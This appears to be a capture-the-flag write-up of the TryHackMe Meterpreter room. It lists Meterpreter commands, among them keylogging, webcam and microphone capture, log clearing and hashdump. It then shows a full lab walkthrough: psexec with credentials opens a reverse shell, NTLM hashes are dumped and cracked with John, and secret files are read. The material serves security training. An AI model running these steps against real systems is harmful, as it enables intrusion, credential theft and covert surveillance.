# TryHackMe: Metasploit: Meterpreter Room Summary

Room URL: https://tryhackme.com/room/meterpreter

## Meterpreter Commands

| **Category** | **Command** | **Description** |
| --- | --- | --- |
| **Core Commands** | **`background`** | Backgrounds the current session |
|  | **`exit`** | Terminate the Meterpreter session |
|  | **`guid`** | Get the session GUID (Globally Unique Identifier) |
|  | **`help`** | Displays the help menu |
|  | **`info`** | Displays information about a Post module |
|  | **`irb`** | Opens an interactive Ruby shell on the current session |
|  | **`load`** | Loads one or more Meterpreter extensions |
|  | **`migrate`** | Allows you to migrate Meterpreter to another process |
|  | **`run`** | Executes a Meterpreter script or Post module |
|  | **`sessions`** | Quickly switch to another session |
| **File System** | **`cd`** | Change directory |
|  | **`ls`** / **`dir`** | List files in the current directory |
|  | **`pwd`** | Prints the current working directory |
|  | **`edit`** | Edit a file |
|  | **`cat`** | Show the contents of a file |
|  | **`rm`** | Delete the specified file |
|  | **`search`** | Search for files |
|  | **`upload`** | Upload a file or directory |
|  | **`download`** | Download a file or directory |
| **Networking** | **`arp`** | Displays the host ARP cache |
|  | **`ifconfig`** | Displays network interfaces on the target |
|  | **`netstat`** | Displays network connections |
|  | **`portfwd`** | Forwards a local port to a remote service |
|  | **`route`** | View and modify the routing table |
| **System** | **`clearev`** | Clears the event logs |
|  | **`execute`** | Executes a command |
|  | **`getpid`** | Shows the current process identifier |
|  | **`getuid`** | Shows the user Meterpreter is running as |
|  | **`kill`** | Terminates a process |
|  | **`pkill`** | Terminates processes by name |
|  | **`ps`** | Lists running processes |
|  | **`reboot`** | Reboots the remote computer |
|  | **`shell`** | Drops into a system command shell |
|  | **`shutdown`** | Shuts down the remote computer |
|  | **`sysinfo`** | Gets information about the remote system (OS, etc.) |
| **Other** | **`idletime`** | Returns the number of seconds the remote user has been idle |
|  | **`keyscan_dump`** | Dumps the keystroke buffer |
|  | **`keyscan_start`** | Starts capturing keystrokes |
|  | **`keyscan_stop`** | Stops capturing keystrokes |
|  | **`screenshare`** | Watch the remote user's desktop in real time |
|  | **`screenshot`** | Takes a screenshot of the interactive desktop |
|  | **`record_mic`** | Records audio from the default microphone |
|  | **`webcam_chat`** | Starts a video chat |
|  | **`webcam_list`** | Lists webcams |
|  | **`webcam_snap`** | Takes a snapshot from the specified webcam |
|  | **`webcam_stream`** | Plays a video stream from the specified webcam |
|  | **`getsystem`** | Attempts privilege escalation to SYSTEM |
|  | **`hashdump`** | Dumps the contents of the SAM database |

## Post-exploitation Challenge

The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.

- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movemen

### Initial Access

```bash
msf6 exploit(windows/smb/psexec) > info

       Name: Microsoft Windows Authenticated User Code Execution
     Module: exploit/windows/smb/psexec
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Manual
  Disclosed: 1999-01-01

Provided by:
  hdm <x@hdm.io>
  Royce Davis <rdavis@accuvant.com>
  RageLtMan <rageltman@sempervictus>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic
      1   PowerShell
      2   Native upload
      3   MOF upload
      4   Command

Check supported:
  No

Basic options:
  Name                  Current Setting  Required  Description
  ----                  ---------------  --------  -----------
  SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                   no        The service display name
  SERVICE_NAME                           no        The service name
  SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read
                                                   /write folder share

  Used when connecting via an existing SESSION:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   no        The session to run this module on

  Used when making a new connection via RHOSTS:

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                        asploit.html
  RPORT      445              no        The target port (TCP)
  SMBDomain  .                no        The Windows domain to use for authentication
  SMBPass                     no        The password for the specified username
  SMBUser                     no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module uses a valid administrator username and password (or
  password hash) to execute an arbitrary payload. This module is similar
  to the "psexec" utility provided by SysInternals. This module is now able
  to clean up after itself. The service created by this tool uses a randomly
  chosen name and description.

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.75.223
RHOSTS => 10.10.75.223
msf6 exploit(windows/smb/psexec) > set SMBUSER ballen
SMBUSER => ballen
msf6 exploit(windows/smb/psexec) > set SMBPASS Password1
SMBPASS => Password1
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.10.25.237:4444 
[*] 10.10.75.223:445 - Connecting to the server...
[*] 10.10.75.223:445 - Authenticating to 10.10.75.223:445 as user 'ballen'...
[*] 10.10.75.223:445 - Selecting PowerShell target
[*] 10.10.75.223:445 - Executing the payload...
[+] 10.10.75.223:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.75.223
[*] Meterpreter session 1 opened (10.10.25.237:4444 -> 10.10.75.223:53132) at 2025-08-07 13:44:07 +0100

meterpreter > 

```

**Gathering Information**

```bash
meterpreter > sysinfo 
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
meterpreter > ls Shares\\
Listing: Shares\
================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2021-07-30 08:18:13 +0100  speedster

meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:dd12007a0535a931099dc764475780ae:::
meterpreter > 

```

**Cracking NTLM Hash**

```bash
root@ip-10-10-116-100:~# nano nt.txt
root@ip-10-10-116-100:~# john --format=nt nt.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (jchambers)
1g 0:00:00:00 DONE (2025-08-07 14:19) 11.11g/s 571733p/s 571733c/s 571733C/s blackrose1..2pac4ever
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 

```

**Searching for Files**

```bash
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100

meterpreter > cd Windows\ Multimedia\ Platform\\
meterpreter > dir
Listing: C:\Program Files (x86)\Windows Multimedia Platform
===========================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  35     fil   2021-07-30 08:44:27 +0100  secrets.txt
100666/rw-rw-rw-  40432  fil   2018-09-15 08:12:04 +0100  sqmapi.dll

meterpreter > cat secrets.txt 
My Twitter password is KDSvbsw3849!
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100
meterpreter > cat ../../inetpub/wwwroot/realsecret.txt
The Flash is the fastest man alive

```
